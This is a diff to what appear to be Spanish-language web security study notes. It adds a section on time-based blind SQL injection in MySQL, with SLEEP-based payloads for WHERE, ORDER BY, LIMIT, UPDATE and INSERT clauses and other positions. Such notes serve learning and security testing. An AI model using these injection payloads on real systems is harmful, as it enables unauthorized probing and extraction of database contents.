@@ -520,14 +520,32 @@ db.close(); // Cierra la base de datos
 waitfor delay '00:00:10' Sleep
 
 ### Tipos de sqli:
-- In-Band:
-  - Error based
-  - Union based
-- Blind:
-  - Boleean based
-  - Time based:
-- Out of Band:
-  - HTTP/DNS responses
+
+#### In-Band:
+- Error based:
+- Union based:
+
+#### Blind:
+- Boleean based:
+- Time based:
+  - Es en base a una función boleana, donde sí el tiempo de espera a la respuesta es mayor a la normal, significa que evalua la función como true y manda a hacer un sleep, o función que ralentiza su ejecución.
+  - MYSQL:
+    - Posición:Dependiendo de en que posición de la ejecución, pero los payloads más sencillos para mysql <5> es:
+      - CAMPOS:   Select $<SLEEP(5)> FROM users;
+      - WHERE:    SELECT * FROM users WHERE username = '$<' OR SLEEP(5)--> -';
+      - ORDER BY: SELECT * FROM users ORDER BY $<IF(1=1, SLEEP(5), 1)>;
+      - HAVING:   SELECT COUNT(\*) FROM users GROUP BY role HAVING COUNT(*) > 0 $<OR SLEEP(5)>;
+      - LIMIT:    SELECT * FROM users LIMIT 1 $<OFFSET (SELECT SLEEP(5))>;
+      - IN:       SELECT * FROM users WHERE id IN $<(SELECT id FROM users WHERE SLEEP(5))>;
+      - UPDATE:   UPDATE users SET email = '$payload' WHERE id = 1; $payload= test@example.com', SLEEP(5), email='test2@example.com
+      - INSERT:   INSERT INTO logs (message) VALUES ('$payload'); $payload= x'), (SLEEP(5)), ('y
+
+
+
+
+    
+#### Out of Band:
+- HTTP/DNS responses
 
 
 ## IDOR:
